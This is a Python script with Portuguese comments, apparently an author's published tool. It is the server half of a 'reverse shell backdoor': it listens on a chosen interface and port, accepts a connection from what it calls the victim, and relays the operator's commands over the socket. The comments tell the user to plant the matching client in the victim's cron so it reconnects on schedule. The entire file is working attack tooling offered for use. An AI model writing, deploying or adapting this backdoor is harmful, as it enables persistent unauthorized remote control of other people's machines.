# SPY-RSB Server ==> Simple Python Reverse Shell Backdoor Server
#
#  ===>  Esse é o codigo servidor, voce roda ele na sua maquina a espera da conexao da vitima!
#  ===>  O cliente voce coloca em algum JOB do CRON da vitima, para garatir o retorno sempre na hora marcada!
#
# Autor: Ygor Bittencourt
# https://www.linkedin.com/in/ygorbittencourt/
# Versao: 2.3 
# 2016-2021
# MIT for you! :) 
#
# Requirements:
# sudo pip install netifaces
#
# FOR USAGE: python3 srv.py


import socket 
import netifaces

if_disponiveis = netifaces.interfaces()
if_selecionada = str(input("\nEm qual interface deseja aguardar a Shell Reversa ? " + str(if_disponiveis) + " ==> ") or "eth0")
porta_selecionada = int(input("\nEm qual porta escutar ?  ==> ") or "8574")
netifaces.ifaddresses(if_selecionada)
ip = netifaces.ifaddresses(if_selecionada)[netifaces.AF_INET][0]['addr']

def connect():

    MeuSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    MeuSocket.bind((ip, porta_selecionada))
    
    MeuSocket.listen(1)
    print ('\n==> Escuta ativada no IP: '+ip+' Porta: '+str(porta_selecionada)+', aguardando input do cliente(a vitima)..')

    conn, addr = MeuSocket.accept() 
    print ('\n==> Cliente conectado com sucesso !!')
    print ('==> Ip / Porta do cliente:', addr)
    print ('\n ::  Para encerrar digite \'sair\' no prompt para NAO prender o socket, caso contrario voce vai ter que esperar +- 1 minuto pra liberar o socket novamente! \n\n ')

    while True:

        entrada = input("# ConexaoReversa # ") 
                
        if 'sair' in str(entrada):
            conn.send(entrada.encode())
            conn.close()
            print ('Conexao Reversa Finalizada')
            break
            

        else:
            conn.send(entrada.encode()) 
            recebido = conn.recv(1024)
            print (recebido.decode())

def main ():
    connect()
main()